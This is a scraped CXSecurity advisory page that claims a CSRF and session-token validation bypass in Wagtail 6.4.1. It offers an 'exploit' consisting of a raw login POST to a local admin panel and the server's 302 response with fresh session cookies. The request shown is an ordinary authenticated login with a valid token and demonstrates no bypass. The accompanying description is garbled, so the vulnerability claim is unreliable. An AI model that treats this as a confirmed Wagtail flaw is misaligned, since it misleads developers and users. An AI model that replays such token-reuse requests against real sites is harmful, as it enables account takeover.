---
title: wagtail-6.4.1 Bypass CSRF Session token validation user interaction
url: https://cxsecurity.com/issue/WLB-2025040040
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-04-29
fetch_date: 2025-10-06T22:02:50.269837
---

# wagtail-6.4.1 Bypass CSRF Session token validation user interaction

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **wagtail-6.4.1 Bypass CSRF Session token validation user interaction** **2025.04.28**  **![bg](https://cert.cx/cxstatic/images/flags/bg.png) [nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/) **(BG)** ![bg](https://cert.cx/cxstatic/images/flags/bg.png)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Titles: wagtail-6.4.1 Bypass CSRF Session token validation user interaction
# Author: nu11secur1ty
# Date: 04/26/2025
# Vendor: https://wagtail.org/
# Software: https://github.com/wagtail/wagtail
# Reference: https://portswigger.net/web-security/csrf/bypassing-token-validation
## Description:
The malicious actor can easily spread to the other malicious actors an already existing CSRF token and a SESSION token
which he has to group attack the system, or he can make a simple exploit on some malicious server to
trick the victim and get his CSRF and SESSION tokens and use them like him to destroy his account, or
other nasty thing!
STATUS: MEDIUM Vulnerability
[+]Exploit:
- CSRF+SESSION:
```CSFR\_SESSION
POST /admin/login/ HTTP/1.1
Host: 127.0.0.1:8000
Content-Length: 134
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="135", "Not-A.Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: en-US,en;q=0.9
Origin: http://127.0.0.1:8000
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8000/admin/login/
Accept-Encoding: gzip, deflate, br
Cookie: csrftoken=IRN97uPkV16iGpY76lUiAH2ThsaEIMKH
Connection: keep-alive
csrfmiddlewaretoken=u3qqmwJn1Mrj4JvkE7XLx77iEie0wOPU2K3pjQoxMDnrAYjhAiHTXEZ1LAeu4qpr&next=%2Fadmin%2F&username=pwned&password=password
```
[+]Response:
```
HTTP/1.1 302 Found
Date: Sat, 26 Apr 2025 05:38:53 GMT
Server: WSGIServer/0.2 CPython/3.13.3
Content-Type: text/html; charset=utf-8
Location: /admin/
Expires: Sat, 26 Apr 2025 05:38:53 GMT
Cache-Control: max-age=0, no-cache, no-store, must-revalidate, private
Vary: Cookie
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin
X-Frame-Options: DENY
Content-Length: 0
Set-Cookie: csrftoken=QYX1fRnAfhLjJ6tRde9UI2So4x6qxnVG; expires=Sat, 25 Apr 2026 05:38:53 GMT; Max-Age=31449600; Path=/; SameSite=Lax
Set-Cookie: sessionid=x9uox1di8jvtfghc05dzsgrgpg05hur9; HttpOnly; Path=/; SameSite=Lax
```
# Reproduce:
[href](https://www.patreon.com/posts/wagtail-6-4-1-127490470)
# Time spent:
01:15:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
0day Exploit DataBase https://0day.today/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <http://nu11secur1ty.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025040040)

[Tweet](https://twitter.com/share)

Vote for this issue:
 2
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top